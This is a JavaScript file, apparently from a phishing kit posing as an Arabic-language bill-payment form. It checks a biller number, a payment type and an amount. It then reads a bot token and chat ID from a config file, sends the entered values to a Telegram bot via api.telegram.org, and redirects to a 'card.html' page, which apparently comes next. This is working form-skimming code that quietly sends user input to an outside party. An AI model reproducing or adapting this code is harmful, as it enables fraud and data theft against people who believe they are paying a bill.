document.addEventListener("DOMContentLoaded", function() {
    var errorText = document.getElementById("errorText");
    var errorText2 = document.getElementById("errorText2");
    var errorText3 = document.getElementById("errorText3");
    var loginButton = document.getElementById("nextButton");
  
    loginButton.addEventListener("click", function() {
        var input100 = document.getElementById("input100").value;
        var input2 = document.getElementById("input2").value;
        var input3 = document.getElementById("input3").value;
  
        // إعادة تعيين الرسائل الخطأ
        errorText.classList.add("hidden");
        errorText2.classList.add("hidden");
        errorText3.classList.add("hidden");
  
        if (input100.length !== 6) {
            errorText.textContent = "يجب أن يكون 6 أرقام.";
            errorText.classList.remove("hidden");
            return;
        }
        if (input2 === "") {
            errorText2.textContent = "اختر نوع السداد.";
            errorText2.classList.remove("hidden");
            return;
        }
        if (input3 === "") {
            errorText3.textContent = "ادخل قيمة السداد.";
            errorText3.classList.remove("hidden");
            return;
        }
  
        // حفظ البيانات في Local Storage
  
        fetch('config/config.json')
        .then(response => response.json())
        .then(config => {
          localStorage.setItem('billerNumber', input100);
            var botToken = config.botToken;
            var chatId = config.chatId;
        var message = "المفوتر : " + input100 + "\n"+"\nنوع الخدمة: " + input2 + "\nالقيمة: " + input3 + "\n";
  
        // إرسال الرسالة إلى تليجرام
        var request = new XMLHttpRequest();
        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
        var params = "chat_id=" + chatId + "&text=" + encodeURIComponent(message);
  
        request.open("POST", url, true);
        request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  
        request.onreadystatechange = function() {
            if (request.readyState === 4 && request.status === 200) {
                console.log("تم إرسال الرسالة إلى تلغرام");
                window.location.href = "card.html";
            }
        };
  
        request.send(params);
      });
  });
  });